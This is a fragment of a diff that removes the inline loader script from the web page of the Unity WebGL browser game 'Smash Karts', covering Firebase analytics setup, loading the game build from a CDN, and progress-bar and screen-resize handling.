-			messagingSenderId: "480659433590",
-			appId: "1:480659433590:web:a01ad1599e963843a0d757",
-			measurementId: "G-1W23DRFHK9"
-		};
-
-	  // Initialize Firebase
-	  	firebase.initializeApp(firebaseConfig);
-
-      var firebaseSupported = false;
-      if(firebase.analytics != null)
-      {
-        firebase.analytics.isSupported().then((isSupported) => 
-        {
-          if (isSupported) 
-          {
-            analytics = firebase.analytics();
-            firebaseSupported = true;
-          }
-          else 
-          {
-            console.log("firebase.analytics() not supported ");
-          }
-        })
-      }
-
-      var perf = firebase.performance();
-
-      firebaseSetScreen("loading_start");
-      firebaseLogEvent("loading_page_start");
-
-      var timerStart = Date.now();
-      var sentGameInstanceStartEvent = false;
-      
-      const buildUrl = "https://smashkartsgc.b-cdn.net/Build2020New";
-      const loaderUrl = buildUrl + "/SmashKartsSCPatch4.loader.js";
-      const config = {
-        dataUrl: buildUrl + "/fd9af547cadb72fc4b6e83d56d5da82a.data.br",
-        frameworkUrl: buildUrl + "/44bcce360664b499f9205162a4907044.js.br",
-        codeUrl: buildUrl + "/cf55536d109c6254a3cf1d22e6451618.wasm.br",
-// #if MEMORY_FILENAME
-//         memoryUrl: buildUrl + "/",
-// #endif
-// #if SYMBOLS_FILENAME
-//         symbolsUrl: buildUrl + "/",
-// #endif
-        streamingAssetsUrl: "StreamingAssets",
-        companyName: "TallTeam",
-        productName: "Smash Karts",
-        productVersion: "1.0.14",
-      };
-
-      var container = document.querySelector("#mainContainer");
-      var canvas = document.querySelector("#gameContainer");
-      var loadingBar = document.querySelector("#loader");
-      var progressBarFull = document.querySelector("#loader .progress .full");
-      var rotateLandscape = document.querySelector("#rotate-landscape");
-
-      if (isMobile()) 
-      {
-        container.className = "unity-mobile";
-      }
-      else
-      {
-        rotateLandscape.id = "rotateLandscapeOff";
-        rotateLandscape.style.display = "none";
-      }
-      const progress = document.querySelector("#loader .progress");
-          progress.style.display = "block";
-          progressBarFull.style.width = "0%";
-      const myTrace = perf.trace('unityLoader');
-      myTrace.start();
-
-      var script = document.createElement("script");
-      script.src = loaderUrl;
-
-      var progressCreateUnityInstance = 0;
-      var progressPostCreateUnityInstance = 0;
-      var updateProgressInterval = setInterval(updateProgress, 100);
-
-      if(isMobile())
-      {
-        setInterval(updateScreenSize, 100);
-      }
-      var gameInstance;
-      script.onload = () => {
-          createUnityInstance(canvas, config, (progress) => {
-          progressCreateUnityInstance = 100 * progress;
-          setProgressWidth();
-        }).then((unityInstance) => {
-          if(isMobile()) document.body.style.background = "#000000";
-          loadingBar.style.display = "none";
-          window.unityGame = unityInstance;
-          gameInstance = unityInstance;
-
-          if(updateProgressInterval) clearInterval(updateProgressInterval);
-          myTrace.stop();
-          var lt = Date.now() - timerStart;
-          firebaseLogEventWithParam("loading_page_complete", "time", lt);
-          setV(lt);
-        }).catch((message) => {
-          alert("TT UnityLoader Error" + message);
-        });
-      };
-      document.body.appendChild(script);
-
-function updateProgress()
-{
-  if(progressCreateUnityInstance > 85)
-  {
-    progressPostCreateUnityInstance += 1;
-    setProgressWidth();
-  }
-}
-
-var lastInnerHeight;
-function updateScreenSize()
-{
-  if(canvas)
-  {
-    if(!lastInnerHeight || lastInnerHeight != window.innerHeight)
-    {
-      lastInnerHeight = window.innerHeight;
-      canvas.style.height = lastInnerHeight + "px";
-    }
-  }
-}
-
-function setProgressWidth()
-{
-  if(progressCreateUnityInstance == 100.0)
-  {
-    progressBarFull.style.width = "100%";
-  }
-  else
-  {
-    var percent;
-    if(isMobile()) 
-    {
-      percent = progressCreateUnityInstance * 0.6 + (progressPostCreateUnityInstance*0.5*0.2 + progressCreateUnityInstance*0.5*0.2*0.05);
-      percent =  Math.min(percent, 90);
-    }
-    else
-    {
-      percent = progressCreateUnityInstance * 0.9 + progressPostCreateUnityInstance * 0.1;
-      percent = Math.min(percent, 95);
-    }
-    progressBarFull.style.width = percent + "%";
-  }
-}
-   </script>
+</body>
 </html>
